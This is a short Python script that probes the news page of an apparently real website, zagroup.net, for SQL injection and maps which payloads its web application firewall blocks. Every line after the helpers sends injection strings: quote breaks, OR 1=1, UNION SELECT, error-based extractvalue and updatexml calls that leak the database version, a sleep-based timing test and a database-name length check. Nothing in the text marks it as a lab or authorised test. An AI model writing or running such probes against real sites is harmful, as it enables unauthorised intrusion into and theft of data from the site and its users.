#!/usr/bin/env python3
"""zagroup.net SQLi - error-based + WAF boundary"""
import urllib.request, re

UA = {"User-Agent": "Mozilla/5.0", "Accept": "*/*"}
BASE = "http://zagroup.net/news.php"

def fetch(url, timeout=10):
    try:
        req = urllib.request.Request(url, headers=UA)
        r = urllib.request.urlopen(req, timeout=timeout)
        return r.status, r.read().decode("utf-8", "ignore")
    except urllib.error.HTTPError as e:
        return e.code, e.read(5000).decode("utf-8", "ignore")
    except Exception as ex:
        return 0, str(ex)

def test(payload, tag):
    u = BASE + "?c=259" + payload
    code, body = fetch(u)
    waf = code == 403
    m = re.search(r'MySQL server error</b>:\s*([^<]+)', body)
    print("%-35s code=%s waf=%s size=%d %s" % (tag, code, waf, len(body), m.group(1)[:100] if m else ""))
    return body

# WAF boundary
print("=== WAF probes ===")
test("%27", "quote")
test("%27%20and%201=1--%20", "and")
test("%27%20OR%201=1--%20", "or")
test("%27%20union%20select%201--%20", "union")
test("%27%20and%20extractvalue(1,concat(0x7e,version()))--%20", "extractvalue")
test("%27%20and%20updatexml(1,concat(0x7e,version()),1)--%20", "updatexml")
test("%27%20and%20(select%201)=1--%20", "subq")
test("%27%20and%20sleep(3)--%20", "sleep")
test("%27%20and%20length(database())=5--%20", "len-db")
